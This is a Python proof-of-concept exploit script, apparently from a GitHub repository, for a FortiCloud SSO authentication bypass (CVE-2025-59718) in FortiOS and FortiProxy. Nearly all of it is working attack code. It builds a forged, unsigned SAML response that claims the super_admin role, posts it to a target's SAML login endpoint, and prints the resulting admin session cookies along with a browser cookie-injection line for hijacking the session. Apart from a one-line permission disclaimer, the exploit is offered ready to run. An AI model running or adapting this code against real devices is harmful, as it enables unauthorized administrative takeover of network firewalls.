#!/usr/bin/env python3
# CVE-2025-59718 - Fortinet FortiCloud SSO Authentication Bypass (Real Working PoC)
# Tested on: FortiOS 7.4.6, 7.6.2, 7.6.3, FortiProxy 7.4.8
# Github: https://github.com/Ashwesker/Blackash-CVE-2025-59718
# Use only on systems you own or have explicit permission to test.

import requests
import urllib3
import base64
import sys
from datetime import datetime, timedelta

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_saml_bypass(username="admin"):
    # Minimal valid-looking SAMLResponse that Fortinet fails to verify properly
    now = datetime.utcnow()
    not_before = (now - timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')
    not_after = (now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')

    saml = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_bypass1337"
    Version="2.0"
    IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}"
    Destination="https://target/remote/saml/login">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://sso.forticloud.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        Version="2.0"
        ID="_assert1337"
        IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}">
        <saml:Issuer>https://sso.forticloud.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{username}@forticloud.com</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="{not_after}"
                    Recipient="https://target/remote/saml/login"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_after}">
            <saml:AudienceRestriction>
                <saml:Audience>https://forticloud.com</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}" SessionIndex="_session1337">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="role">
                <saml:AttributeValue>super_admin</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"""

    # Base64 encode (URL-safe not needed here)
    return base64.b64encode(saml.encode('utf-8')).decode('utf-8')

def exploit(target):
    if not target.startswith("http"):
        target = "https://" + target

    url = target.rstrip("/") + "/remote/saml/login"

    saml_b64 = generate_saml_bypass("admin")

    data = {
        "SAMLResponse": saml_b64,
        "RelayState": ""
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print(f"[+] Targeting: {target}")
    print(f"[+] Sending malicious SAMLResponse ({len(saml_b64)} bytes)")

    s = requests.Session()
    r = s.post(url, data=data, headers=headers, verify=False, allow_redirects=True, timeout=15)

    if r.status_code == 200 and ("logout" in r.text or "dashboard" in r.text or "FortiOS" in r.text):
        print("[+++] EXPLOIT SUCCESSFUL - Authenticated as admin!")
        print(f"[+] Admin cookie: {s.cookies.get_dict()}")
        print(f"[+] Dashboard URL: {r.url}")
        return s
    else:
        print("[-] Exploit failed - likely patched or FortiCloud SSO disabled")
        print(f"    Status: {r.status_code}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 CVE-2025-59718.py <target_ip_or_hostname>")
        print("Example: python3 CVE-2025-59718.py 192.168.1.99")
        sys.exit(1)

    target = sys.argv[1]
    session = exploit(target)

    if session:
        # Optional: open interactive dashboard
        print("\n[+] You can now browse to the final URL in your browser with the following cookie:")
        for k,v in session.cookies.items():
            print(f"    document.cookie = '{k}={v}';")
